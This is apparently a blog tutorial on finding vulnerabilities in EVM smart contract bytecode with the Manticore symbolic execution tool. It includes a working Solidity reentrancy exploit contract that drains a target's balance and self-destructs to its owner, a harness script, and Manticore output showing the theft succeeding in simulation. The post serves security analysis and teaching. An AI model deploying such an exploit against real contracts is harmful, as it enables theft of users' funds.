---
title: bytecode only analysis of evm smart contracts
summary: Bytecode only analysis of EVM smart contracts Lets assume weve located a smart contract on the blockchain. We have the contract address where we retrieve its runtime bytecode. We also easily find the transaction receipt data of the contracts deployment, further giving us the init and runtime bytecode. What were lacking is the source code, what compiler was used (though contract prologue instructions were amended starting in Solidity version 0.4.22, so by inference we know this bytecode is at lea
authors:
  - Wil Barnes (@wil)
date: 2019-02-28
some_url: 
---

# bytecode only analysis of evm smart contracts

# Bytecode only analysis of EVM smart contracts

Let's assume we've located a smart contract on the blockchain. We have the contract address where we retrieve its runtime bytecode. We also easily find the transaction receipt data of the contract's deployment, further giving us the init and runtime bytecode. What we're lacking is the source code, what compiler was used (though contract prologue instructions were amended starting in Solidity version 0.4.22, so by inference we know this bytecode is at least v0.4.22 or greater). 

The bytecode:
```
608060405234801561001057600080fd5b5061029e806100206000396000f3fe608060405260043610610051576000357c0100000000000000000000000000000000000000000000000000000000900480635fd8c71014610056578063c0e317fb1461006d578063f8b2cb4f14610077575b600080fd5b34801561006257600080fd5b5061006b6100dc565b005b6100756101dc565b005b34801561008357600080fd5b506100c66004803603602081101561009a57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061022a565b6040518082815260200191505060405180910390f35b60008060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905060003373ffffffffffffffffffffffffffffffffffffffff168260405180600001905060006040518083038185875af1925050503d806000811461017f576040519150601f19603f3d011682016040523d82523d6000602084013e610184565b606091505b5050905080151561019457600080fd5b60008060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055505050565b346000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540192505081905550565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905091905056fea165627a7a72305820ad65826828da0a2a292bc745bc98d2fd1e005d092922c517e42996d1d234420b0029
```

Imagine a scenario where a malicious actor is interested in testing this bytecode for vulnerabilities. I'd argue that with an unknown like this the best plan of action is to try to find a cursory perimeter, something you could digest to better understand what's going on internally, and work from there. This is personal preference. 

Symbolic execution is a process that can help us do this. In this experiment we will use the Manticore symbolic execution tool to explore all possible states of this bytecode, and start closing in on any vulnerabilities, should they exist. 

Using a basic script, we can quickly get some useful output: 
```
from manticore.ethereum import evm, ManticoreEVM
from binascii import unhexlify, hexlify
################ Script #######################
# Bytecode only based analysis
# No solidity, no compiler

m = ManticoreEVM()

with open('Reentrancy.bin', 'rb') as f:
    init_bytecode = unhexlify(f.read())

user_account = m.create_account(balance=1000)
print("[+] Creating a user account", user_account)

print("[+] Init bytecode:", hexlify(init_bytecode))

print("[+] EVM init assembler:")
for instr in evm.EVMAsm.disassemble_all(init_bytecode[:-44]):
    print(hex(instr.pc), instr)

contract_account = m.create_contract(owner=user_account, init=init_bytecode)
print("[+] Creating a contract account", contract_account)

print("[+] Now the symbolic values")
symbolic_data = m.make_symbolic_buffer(320) 
symbolic_value = m.make_symbolic_value()
m.transaction(caller=user_account,
                address=contract_account,
                data=symbolic_data,
                value=symbolic_value )

#Let seth know we are not sending more transactions 
m.finalize()
print(f"[+] Look for results in {m.workspace}")
```

Manticore creates a folder where you will find the generated testcases. Opening test_00000000.summary you'll find a summary of that running state. In test_00000001.summary we see that value can be sent to the contract, and in test_00000001.tx we can further see the function selector used to send value: "0xc0e317fb". We know this function is payable. 
```
Message: STOP
Last exception: STOP
2 accounts.
* normal0::
Address: 0x5da83cffb5bab1cd888417a5ecefe37b9e250d67 
Balance: 511 (*)
Storage: STORAGE_5da83cffb5bab1cd888417a5ecefe37b9e250d67

* contract0::
Address: 0xafb6d63079413d167770de9c3f50db6477811bdb 
Balance: 489 (*)
Storage: (store )
Storage:
storage[7816397e3545e9ccd415bbf8c3bd4e40761569b085f1792a6a70aa795f6c6aab] = 1e9 (*)
Code:
	b'608060405260043610610051576000357c010000000000000000000000000000'
	b'0000000000000000000000000000900480635fd8c71014610056578063c0e317'
	b'fb1461006d578063f8b2cb4f14610077575b600080fd5b348015610062576000'
	b'80fd5b5061006b6100dc565b005b6100756101dc565b005b3480156100835760'
	b'0080fd5b506100c66004803603602081101561009a57600080fd5b8101908080'
	b'3573ffffffffffffffffffffffffffffffffffffffff16906020019092919050'
	b'505061022a565b6040518082815260200191505060405180910390f35b600080'
	b'60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffff'
	b'ffffffffffffffffffffffffffff168152602001908152602001600020549050'
	b'60003373ffffffffffffffffffffffffffffffffffffffff1682604051806000'
	b'01905060006040518083038185875af1925050503d806000811461017f576040'
	b'519150601f19603f3d011682016040523d82523d6000602084013e610184565b'
	b'606091505b5050905080151561019457600080fd5b60008060003373ffffffff'
	b'ffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffff'
	b'ffffffffffff168152602001908152602001600020819055505050565b346000'
	b'803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffff'
	b'ffffffffffffffffffffffffff16815260200190815260200160002060008282'
	b'540192505081905550565b60008060008373ffffffffffffffffffffffffffff'
	b'ffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260'
	b'200190815260200160002054905091905056fea165627a7a72305820ad658268'
	b'28da0a2a292bc745bc98d2fd1e005d092922c517e42996d1d234420b0029'
Coverage 20% (on this state)

Known hashes:
b'0000000000000000000000005da83cffb5bab1cd888417a5ecefe37b9e250d670000000000000000000000000000000000000000000000000000000000000000'::7816397e3545e9ccd415bbf8c3bd4e40761569b085f1792a6a70aa795f6c6aab
b'000000000000000000000000afb6d63079413d167770de9c3f50db6477811bdb0000000000000000000000000000000000000000000000000000000000000000'::af8416e3f6eaf8528e11574b4367415609bca11ad83ed38534f2d6034a52a174


(*) Example solution given. Value is symbolic and may take other values
```

There's a good amount of output here for one to parse through. We won't walk through what all of it means here as I'd expect most readers have a generic understanding of the EVM's internals and how it works. 

We know this contract is payable. Let's assume that the bytecode contract on the blockchain has value. 

Assumptions:
* we know the "0xc0e317fb" function is payable
* on-chain contract has value, let's say it has a value of 1000

If you can deposit value to a smart contract, you may be able to withdraw value from a smart contract (though not always). Perhaps this contract is vulnerable to reentrancy. We will test this using Manticore. 

The script to test this is a bit more advanced, and requires an exploiting contract: 'ReentranceExploit.sol' to test. 

*ReentranceExploit.sol*

```
pragma solidity ^0.5.2;

contract ReentranceExploit
{
    int reentry_reps = 10;
    address public vulnerable_contract;
    address payable owner;
    bytes reentry_attack_string;
    
    constructor()
    public 
    {
        owner = msg.sender;
    }
    
    function set_vulnerable_contract(address _vulnerable_contract)
    public
    {
        vulnerable_contract = _vulnerable_contract;
    }
    
    function set_reentry_attack_string(bytes memory _reentry_attack_string)
    public
    {
        reentry_attack_string = _reentry_attack_string;
    }
    
    function set_reentry_reps(int reps)
    public
    {
        reentry_reps = reps;
    }
    
    function proxycall(bytes memory data) 
    payable
    public 
    {
        (bool success,) = vulnerable_contract.call.value(msg.value)(data);
        require(success);
    }
    
    function get_money()
    public
    {
        uint256 fullbalance = address(this).balance;
        (bool success,) = address(owner).call.value(fullbalance)("");
        require(success);
        selfdestruct(owner);
    }
    
    function ()
    payable
    external 
    {
        if (reentry_reps > 0) {
            reentry_reps = reentry_reps - 1;
            (bool success,) = vulnerable_contract.call(reentry_attack_string);
            require(success);
        }
    }
}
```

And the Manticore python script: *minbytecodereentrancyproxy.py*
```
from manticore.ethereum import evm, ManticoreEVM, ABI 
from binascii import unhexlify, hexlify

# bytecode only based analysis: no solidity, no compiler

m = ManticoreEVM()
m.verbosity(1)

# function selectors retrieved from initial manticore output
selector_one    = b"c0e317fb"  # addToBalance()
selector_two    = b"f8b2cb4f" # getBalance(address)
selector_three  = b"5fd8c710" # withdrawBalance()

"""
Assumptions
(1) we only have our target's bytecode: 'Reentrancy.bin'; no source code, no known compiler
(2) we compile our exploiting contract, 'ReentrancyExploit.sol', from source (we wrote it to test our exploit)
"""

with open("Reentrancy.bin", "rb") as f:
    contract_bytecode   = unhexlify(f.read())
    print("[1] contract bytecode retrieved (print truncated):", hexlify(contract_bytecode[:12]))

with open("ReentranceExploit.sol", "r") as r:
    exploit_source   = r.read()
    print("[2] exploit bytecode retrieved (print truncated):", exploit_source[:12])

user_account        = m.create_account(balance=1337)
print("[3] user account created", user_account)

adversary_account   = m.create_account(balance=1337)
print("[4] adversary account create:", adversary_account)

vuln_contract = m.create_contract(owner=user_account, init=contract_bytecode)
print("[5] reentrancy contract account created:", vuln_contract)

print("[6] EVM init assembler:")
#for instr in evm.EVMAsm.disassemble_all(contract_bytecode):
#    print(hex(instr.pc), instr)

exploit_contract    = m.solidity_create_contract(exploit_source, owner=adversary_account)

#symbolic_data   = m.make_symbolic_buffer(4)
#symbolic_value  = m.make_symbolic_value()
print("[7] symbolic values and symbolic data created.")

# recreate smart contract state; vulnerable contract given balance of 1000 
m.transaction(
    caller  = user_account,
    address = vuln_contract,
    data    = unhexlify(b"c0e317fb"),
    value   = 1000
)

print("[8] ############### initial contract environment ###############")
for state in m.running_states:
    print("...a) user account balance:",      state.platform[int(user_account)]['balance'])
    print("...b) adversary account balance:", state.platform[int(adversary_account)]['balance'])
    print("...c) reentrancy contract balance:", state.platform[int(vuln_contract)]['balance'])
    print("...d) exploit contract balance:", state.platform[int(exploit_contract)]['balance'])

exploit_contract.set_vulnerable_contract(vuln_contract)
exploit_contract.set_reentry_reps(30)
exploit_contract.set_reentry_attack_string(m.make_symbolic_buffer(4))
exploit_contract.proxycall(m.make_symbolic_buffer(4), value=m.make_symbolic_value())
exploit_contract.proxycall(m.make_symbolic_buffer(4))
exploit_contract.get_money()

for state in m.running_states:
    result = m.solve_one(symbolic_data)

m.finalize()
print(f"[12] look for results in {m.workspace}")
```

This will take awhile, as we're inputting symbolic data and values into proxy calls to the target contract. Manticore has a lot to iterate through. In the end, it should generate approximately 51 testcases, most ending in selfdestruction of the exploiting contract. Reading through these test cases you'll see generic behavior, calls ending in stops, reverts, and a long list of selfdestructs. 

Making my way through these test cases, in test_00000010.summary it becomes evident that this contract is vulnerable to reentrancy. See below. 

```
Message: SELFDESTRUCT
Last exception: SELFDESTRUCT
Last instruction at contract c783acd0ffd02f296bf1c74f050ae428dd0afc15 offset 61c
    48  selfdestruct(owner)

3 accounts.
* normal0::
Address: 0x5da83cffb5bab1cd888417a5ecefe37b9e250d67 
Balance: 337 
Storage: STORAGE_5da83cffb5bab1cd888417a5ecefe37b9e250d67

* normal1::
Address: 0xc6737b8b2a6a7b5fbb5d75b895f628f2922bae14 
Balance: 2327 (*)
Storage: STORAGE_c6737b8b2a6a7b5fbb5d75b895f628f2922bae14

* contract0::
Address: 0xafb6d63079413d167770de9c3f50db6477811bdb 
Balance: 10 (*)
Storage: (store )
Storage:
storage[7816397e3545e9ccd415bbf8c3bd4e40761569b085f1792a6a70aa795f6c6aab] = 3e8 (*)
Code:
	b'608060405260043610610051576000357c010000000000000000000000000000'
	b'0000000000000000000000000000900480635fd8c71014610056578063c0e317'
	b'fb1461006d578063f8b2cb4f14610077575b600080fd5b348015610062576000'
	b'80fd5b5061006b6100dc565b005b6100756101dc565b005b3480156100835760'
	b'0080fd5b506100c66004803603602081101561009a57600080fd5b8101908080'
	b'3573ffffffffffffffffffffffffffffffffffffffff16906020019092919050'
	b'505061022a565b6040518082815260200191505060405180910390f35b600080'
	b'60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffff'
	b'ffffffffffffffffffffffffffff168152602001908152602001600020549050'
	b'60003373ffffffffffffffffffffffffffffffffffffffff1682604051806000'
	b'01905060006040518083038185875af1925050503d806000811461017f576040'
	b'519150601f19603f3d011682016040523d82523d6000602084013e610184565b'
	b'606091505b5050905080151561019457600080fd5b60008060003373ffffffff'
	b'ffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffff'
	b'ffffffffffff168152602001908152602001600020819055505050565b346000'
	b'803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffff'
	b'ffffffffffffffffffffffffff16815260200190815260200160002060008282'
	b'540192505081905550565b60008060008373ffffffffffffffffffffffffffff'
	b'ffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260'
	b'200190815260200160002054905091905056fea165627a7a72305820ad658268'
	b'28da0a2a292bc745bc98d2fd1e005d092922c517e42996d1d234420b0029'
Coverage 48% (on this state)

Known hashes:
b'000000000000000000000000c6737b8b2a6a7b5fbb5d75b895f628f2922bae140000000000000000000000000000000000000000000000000000000000000000'::acb3ad683644165743a5f4d2282adcb5a198abf3c065dd77179e2e687b33233b
b'0000000000000000000000005da83cffb5bab1cd888417a5ecefe37b9e250d670000000000000000000000000000000000000000000000000000000000000000'::7816397e3545e9ccd415bbf8c3bd4e40761569b085f1792a6a70aa795f6c6aab
b'0000000000000000000000000000000000000000000000000000000000000003'::c2575a0e9e593c00f959f8c92f12db2869c3395a3b0502d05e2516446f71f85b
b'000000000000000000000000c783acd0ffd02f296bf1c74f050ae428dd0afc150000000000000000000000000000000000000000000000000000000000000000'::ff5deb57fffaedcff45a9955a8ad5c8a54a7dfa49121627d592fbae63c210a6b
b'000000000000000000000000afb6d63079413d167770de9c3f50db6477811bdb0000000000000000000000000000000000000000000000000000000000000000'::af8416e3f6eaf8528e11574b4367415609bca11ad83ed38534f2d6034a52a174


(*) Example solution given. Value is symbolic and may take other values
```

There's three accounts here:
* normal0, this is the deployer of the target contract
* normal1, the adversarial account looking to exploit the target contract
* contract0, the target contract deployed by normal0
* contract1, (?) i thought we deployed 2? we did, it selfdestructed

Our adversarial account, normal1, now has a balance of 2327, contract0 has a balance of 10, and contract1 has selfdestructed. In the selfdestruct, contract1 sends all value to normal1. 

Remember, both accounts started with a value balance of 1337, and the target contract started with an intial value balance of 1000. 

Let's look at the symbolic transaction that successfully executed the exploit (which is output generated by Manticore):
```
Transactions No. 0
Type: CREATE (0)
From: normal0(0x5da83cffb5bab1cd888417a5ecefe37b9e250d67) 
To: contract0(0xafb6d63079413d167770de9c3f50db6477811bdb) 
Value: 0 
Gas used: 21000 
Data: 0x608060405234801561001057600080fd5b5061029e806100206000396000f3fe608060405260043610610051576000357c0100000000000000000000000000000000000000000000000000000000900480635fd8c71014610056578063c0e317fb1461006d578063f8b2cb4f14610077575b600080fd5b34801561006257600080fd5b5061006b6100dc565b005b6100756101dc565b005b34801561008357600080fd5b506100c66004803603602081101561009a57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061022a565b6040518082815260200191505060405180910390f35b60008060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905060003373ffffffffffffffffffffffffffffffffffffffff168260405180600001905060006040518083038185875af1925050503d806000811461017f576040519150601f19603f3d011682016040523d82523d6000602084013e610184565b606091505b5050905080151561019457600080fd5b60008060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055505050565b346000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540192505081905550565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905091905056fea165627a7a72305820ad65826828da0a2a292bc745bc98d2fd1e005d092922c517e42996d1d234420b0029 
Return_data: 0x608060405260043610610051576000357c0100000000000000000000000000000000000000000000000000000000900480635fd8c71014610056578063c0e317fb1461006d578063f8b2cb4f14610077575b600080fd5b34801561006257600080fd5b5061006b6100dc565b005b6100756101dc565b005b34801561008357600080fd5b506100c66004803603602081101561009a57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061022a565b6040518082815260200191505060405180910390f35b60008060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905060003373ffffffffffffffffffffffffffffffffffffffff168260405180600001905060006040518083038185875af1925050503d806000811461017f576040519150601f19603f3d011682016040523d82523d6000602084013e610184565b606091505b5050905080151561019457600080fd5b60008060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055505050565b346000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540192505081905550565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905091905056fea165627a7a72305820ad65826828da0a2a292bc745bc98d2fd1e005d092922c517e42996d1d234420b0029 (*)


Transactions No. 1
Type: CREATE (0)
From: normal1(0xc6737b8b2a6a7b5fbb5d75b895f628f2922bae14) 
To: contract1(0xc783acd0ffd02f296bf1c74f050ae428dd0afc15) 
Value: 0 
Gas used: 90000 
Data: 0x6080604052600a60005534801561001557600080fd5b5033600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550610732806100666000396000f3fe608060405260043610610072576000357c0100000000000000000000000000000000000000000000000000000000900480630d4b1aca1461017b5780634041ddc2146101b65780639d15fd171461020d578063b1f14dec146102d5578063b802926914610390578063beac44e7146103a7575b600080541315610179576001600054036000819055506000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16600360405180828054600181600116156101000203166002900480156101205780601f106100fe576101008083540402835291820191610120565b820191906000526020600020905b81548152906001019060200180831161010c575b50509150506000604051808303816000865af19150503d8060008114610162576040519150601f19603f3d011682016040523d82523d6000602084013e610167565b606091505b5050905080151561017757600080fd5b505b005b34801561018757600080fd5b506101b46004803603602081101561019e57600080fd5b81019080803590602001909291905050506103f8565b005b3480156101c257600080fd5b506101cb610402565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561021957600080fd5b506102d36004803603602081101561023057600080fd5b810190808035906020019064010000000081111561024d57600080fd5b82018360208201111561025f57600080fd5b8035906020019184600183028401116401000000008311171561028157600080fd5b91908080601f016020809104026020016040519081016040528093929190818152602001838380828437600081840152601f19601f820116905080830192505050505050509192919290505050610428565b005b61038e600480360360208110156102eb57600080fd5b810190808035906020019064010000000081111561030857600080fd5b82018360208201111561031a57600080fd5b8035906020019184600183028401116401000000008311171561033c57600080fd5b91908080601f016020809104026020016040519081016040528093929190818152602001838380828437600081840152601f19601f820116905080830192505050505050509192919290505050610442565b005b34801561039c57600080fd5b506103a561052f565b005b3480156103b357600080fd5b506103f6600480360360208110156103ca57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061061d565b005b8060008190555050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b806003908051906020019061043e929190610661565b5050565b6000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1634836040518082805190602001908083835b6020831015156104b4578051825260208201915060208101905060208303925061048f565b6001836020036101000a03801982511681845116808217855250505050505090500191505060006040518083038185875af1925050503d8060008114610516576040519150601f19603f3d011682016040523d82523d6000602084013e61051b565b606091505b5050905080151561052b57600080fd5b5050565b60003073ffffffffffffffffffffffffffffffffffffffff163190506000600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168260405180600001905060006040518083038185875af1925050503d80600081146105cd576040519150601f19603f3d011682016040523d82523d6000602084013e6105d2565b606091505b505090508015156105e257600080fd5b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16ff5b80600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f106106a257805160ff19168380011785556106d0565b828001600101855582156106d0579182015b828111156106cf5782518255916020019190600101906106b4565b5b5090506106dd91906106e1565b5090565b61070391905b808211156106ff5760008160009055506001016106e7565b5090565b9056fea165627a7a72305820f2f6bd982a55eaf1e3f26f381a1b7b1edd0359c9ae6e3195a609651f3c2327e70029 
Return_data: 0x608060405260043610610072576000357c0100000000000000000000000000000000000000000000000000000000900480630d4b1aca1461017b5780634041ddc2146101b65780639d15fd171461020d578063b1f14dec146102d5578063b802926914610390578063beac44e7146103a7575b600080541315610179576001600054036000819055506000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16600360405180828054600181600116156101000203166002900480156101205780601f106100fe576101008083540402835291820191610120565b820191906000526020600020905b81548152906001019060200180831161010c575b50509150506000604051808303816000865af19150503d8060008114610162576040519150601f19603f3d011682016040523d82523d6000602084013e610167565b606091505b5050905080151561017757600080fd5b505b005b34801561018757600080fd5b506101b46004803603602081101561019e57600080fd5b81019080803590602001909291905050506103f8565b005b3480156101c257600080fd5b506101cb610402565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561021957600080fd5b506102d36004803603602081101561023057600080fd5b810190808035906020019064010000000081111561024d57600080fd5b82018360208201111561025f57600080fd5b8035906020019184600183028401116401000000008311171561028157600080fd5b91908080601f016020809104026020016040519081016040528093929190818152602001838380828437600081840152601f19601f820116905080830192505050505050509192919290505050610428565b005b61038e600480360360208110156102eb57600080fd5b810190808035906020019064010000000081111561030857600080fd5b82018360208201111561031a57600080fd5b8035906020019184600183028401116401000000008311171561033c57600080fd5b91908080601f016020809104026020016040519081016040528093929190818152602001838380828437600081840152601f19601f820116905080830192505050505050509192919290505050610442565b005b34801561039c57600080fd5b506103a561052f565b005b3480156103b357600080fd5b506103f6600480360360208110156103ca57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061061d565b005b8060008190555050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b806003908051906020019061043e929190610661565b5050565b6000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1634836040518082805190602001908083835b6020831015156104b4578051825260208201915060208101905060208303925061048f565b6001836020036101000a03801982511681845116808217855250505050505090500191505060006040518083038185875af1925050503d8060008114610516576040519150601f19603f3d011682016040523d82523d6000602084013e61051b565b606091505b5050905080151561052b57600080fd5b5050565b60003073ffffffffffffffffffffffffffffffffffffffff163190506000600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168260405180600001905060006040518083038185875af1925050503d80600081146105cd576040519150601f19603f3d011682016040523d82523d6000602084013e6105d2565b606091505b505090508015156105e257600080fd5b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16ff5b80600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f106106a257805160ff19168380011785556106d0565b828001600101855582156106d0579182015b828111156106cf5782518255916020019190600101906106b4565b5b5090506106dd91906106e1565b5090565b61070391905b808211156106ff5760008160009055506001016106e7565b5090565b9056fea165627a7a72305820f2f6bd982a55eaf1e3f26f381a1b7b1edd0359c9ae6e3195a609651f3c2327e70029 (*)
Function call:
Constructor() -> RETURN 


Transactions No. 2
Type: CALL (0)
From: normal0(0x5da83cffb5bab1cd888417a5ecefe37b9e250d67) 
To: contract0(0xafb6d63079413d167770de9c3f50db6477811bdb) 
Value: 1000 
Gas used: 21000 
Data: 0xc0e317fb 
Return_data: 0x 


Transactions No. 3
Type: CALL (0)
From: normal1(0xc6737b8b2a6a7b5fbb5d75b895f628f2922bae14) 
To: contract1(0xc783acd0ffd02f296bf1c74f050ae428dd0afc15) 
Value: 0 
Gas used: 281474976710655 
Data: 0xbeac44e7000000000000000000000000afb6d63079413d167770de9c3f50db6477811bdb 
Return_data: 0x 

Function call:
set_vulnerable_contract(1003150779044222824843138452687820282225015987163) -> STOP 


Transactions No. 4
Type: CALL (0)
From: normal1(0xc6737b8b2a6a7b5fbb5d75b895f628f2922bae14) 
To: contract1(0xc783acd0ffd02f296bf1c74f050ae428dd0afc15) 
Value: 0 
Gas used: 281474976710655 
Data: 0x0d4b1aca000000000000000000000000000000000000000000000000000000000000001e 
Return_data: 0x 

Function call:
set_reentry_reps(30) -> STOP 


Transactions No. 5
Type: CALL (0)
From: normal1(0xc6737b8b2a6a7b5fbb5d75b895f628f2922bae14) 
To: contract1(0xc783acd0ffd02f296bf1c74f050ae428dd0afc15) 
Value: 0 
Gas used: 281474976710655 
Data: 0x9d15fd17000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000045fd8c71000000000000000000000000000000000000000000000000000000000 (*)
Return_data: 0x 

Function call:
set_reentry_attack_string(bytearray(b'_\xd8\xc7\x10')) -> STOP (*)


Transactions No. 7
Type: CALL (0)
From: normal1(0xc6737b8b2a6a7b5fbb5d75b895f628f2922bae14) 
To: contract1(0xc783acd0ffd02f296bf1c74f050ae428dd0afc15) 
Value: 45 (*)
Gas used: 281474976710655 
Data: 0xb1f14dec00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004c0e317fb00000000000000000000000000000000000000000000000000000000 (*)
Return_data: 0x 

Function call:
proxycall(bytearray(b'\xc0\xe3\x17\xfb')) -> STOP (*)


Transactions No. 55
Type: CALL (0)
From: normal1(0xc6737b8b2a6a7b5fbb5d75b895f628f2922bae14) 
To: contract1(0xc783acd0ffd02f296bf1c74f050ae428dd0afc15) 
Value: 0 
Gas used: 281474976710655 
Data: 0xb1f14dec000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000045fd8c71000000000000000000000000000000000000000000000000000000000 (*)
Return_data: 0x 

Function call:
proxycall(bytearray(b'_\xd8\xc7\x10')) -> STOP (*)


Transactions No. 57
Type: CALL (0)
From: normal1(0xc6737b8b2a6a7b5fbb5d75b895f628f2922bae14) 
To: contract1(0xc783acd0ffd02f296bf1c74f050ae428dd0afc15) 
Value: 0 
Gas used: 281474976710655 
Data: 0xb8029269 
Return_data: 0x 

Function call:
get_money() -> SELFDESTRUCT 


```

There is a lot going on here, but it's rather simple. Our script cycled through symbolic data and values and worked through all possible states, eventually it called a function that allowed a user to withdraw their funds. Here our exploiting contract was prepared with a payable fallback function to receive the funds, and make a call back to the target contract to initiate another withdrawal before the balance in the target contract can be updated. 


